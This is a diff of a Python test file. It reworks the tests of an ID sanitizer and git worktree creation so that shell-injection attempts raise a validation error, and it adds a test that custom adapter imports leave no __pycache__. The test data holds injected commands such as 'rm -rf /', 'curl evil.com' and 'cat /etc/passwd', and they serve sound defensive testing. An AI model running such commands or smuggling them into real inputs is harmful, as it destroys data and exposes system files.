@@ -388,15 +388,12 @@ def test_sanitize_id_valid():
 
 
 def test_sanitize_id_rejects_shell_metacharacters():
-    """IDs with shell metacharacters should cause sys.exit."""
-    with pytest.raises(SystemExit):
-        _sanitize_id("slice; rm -rf /")
+    """IDs with shell metacharacters must raise, not exit the process."""
+    from scripts.errors import ValidationError
 
-    with pytest.raises(SystemExit):
-        _sanitize_id("slice && curl evil.com")
-
-    with pytest.raises(SystemExit):
-        _sanitize_id("slice | cat /etc/passwd")
+    for bad in ("slice; rm -rf /", "slice && curl evil.com", "slice | cat /etc/passwd"):
+        with pytest.raises(ValidationError):
+            _sanitize_id(bad)
 
 
 # ===== _to_plain_dict =====
@@ -412,16 +409,30 @@ def test_to_plain_dict_with_primitives():
 # ===== create_git_worktree =====
 
 def test_create_git_worktree_rejects_malicious_id():
-    """Worktree creation with shell injection attempt should abort."""
-    with pytest.raises(SystemExit):
-        create_git_worktree_safe("foo; rm -rf /")
-
-
-def create_git_worktree_safe(slice_id):
-    """Helper to test create_git_worktree with sanitization."""
+    """Worktree creation with a shell-injection attempt must raise ValidationError."""
+    from scripts.errors import ValidationError
     from scripts.git_ops import create_git_worktree
+
     with tempfile.TemporaryDirectory() as tmpdir:
-        create_git_worktree(slice_id, project_root=Path(tmpdir))
+        with pytest.raises(ValidationError):
+            create_git_worktree("foo; rm -rf /", project_root=Path(tmpdir))
+
+
+def test_custom_adapter_import_leaves_no_pycache():
+    """A custom adapter must not dirty the user's tree with __pycache__."""
+    from scripts.adapters.loader import get_harness_adapter
+
+    with tempfile.TemporaryDirectory() as tmp_path_str:
+        tmp_path = Path(tmp_path_str)
+        (tmp_path / "my_adapter.py").write_text(
+            "from scripts.adapters.base import HarnessAdapter\n"
+            "class Mine(HarnessAdapter):\n"
+            "    def build_command(self, agent_config, task_prompt):\n"
+            "        return ['echo', task_prompt]\n",
+            encoding="utf-8",
+        )
+        get_harness_adapter({"harness_adapter": "my_adapter.py"}, tmp_path)
+        assert not (tmp_path / "__pycache__").exists()
 
 
 # ===== cmd_summary =====
